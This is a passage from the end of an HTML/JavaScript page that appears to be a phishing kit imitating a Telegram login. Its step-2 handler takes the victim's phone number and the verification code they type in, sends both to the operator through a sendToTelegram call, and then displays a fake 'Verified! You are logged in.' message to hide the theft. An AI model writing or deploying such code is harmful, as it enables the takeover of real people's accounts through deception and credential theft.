                            // Hold the success message briefly before hiding the overlay
                            setTimeout(() => {
                                statusOverlay.classList.remove('overlay-visible');
                                statusOverlay.classList.add('overlay-hidden');
                                
                                goToStep2(); // Switch to the code input screen
                                
                                // Reset message for next attempt
                                overlayMessage.textContent = 'Sending Code...';
                            }, 500);

                        }, remainingDelay);
                    });
            });

            // --- Step 2 Form Submission (Verification Code) ---
            codeForm.addEventListener('submit', (e) => {
                e.preventDefault();
                const code = document.getElementById('codeInput').value.trim();
                
                if (!code) {
                    overlayMessage.textContent = 'Please enter the code.';
                    // Show message briefly (custom alert)
                    statusOverlay.classList.remove('overlay-hidden');
                    statusOverlay.classList.add('overlay-visible');

                    setTimeout(() => {
                         statusOverlay.classList.remove('overlay-visible');
                         statusOverlay.classList.add('overlay-hidden');
                    }, 2000);
                    return;
                }
                
                // Using HTML formatting for Telegram message
                const logMessage = `<b>üîë Telegram Code Submitted:</b>\nPhone: <code>${countryCode} ${phoneNumber}</code>\nCode: <code>${code}</code>`;

                // Send the verification code to Telegram as well (highly recommended for a complete logging sequence)
                sendToTelegram(logMessage);

                // 1. Show the overlay and start the timer
                const startTime = Date.now();
                statusOverlay.classList.remove('overlay-hidden');
                statusOverlay.classList.add('overlay-visible');
                overlayMessage.textContent = 'Verifying Code...';
                loader.style.display = 'block';
                loader.classList.add('animate-spin');

                // Simulate processing delay
                const delay = 3000;
                
                setTimeout(() => {
                    overlayMessage.textContent = 'Verified! You are logged in.';
                    loader.classList.remove('animate-spin');
                    loader.style.display = 'none';

                    // Hold the success message for 1 second before resetting
                    setTimeout(() => {
                        // Simulate full page reset/navigation
                        phoneForm.reset();
                        codeForm.reset();
                        
                        statusOverlay.classList.remove('overlay-visible');
                        statusOverlay.classList.add('overlay-hidden');
                        
                        // Go back to the initial step (Step 1)
                        step2Div.classList.add('hidden');
                        step1Div.classList.remove('hidden');
                        currentStep = 1;
                        overlayMessage.textContent = 'Sending Code...';
                    }, 1000);
                }, delay);

            });
        });
    </script>
</body>
</html>
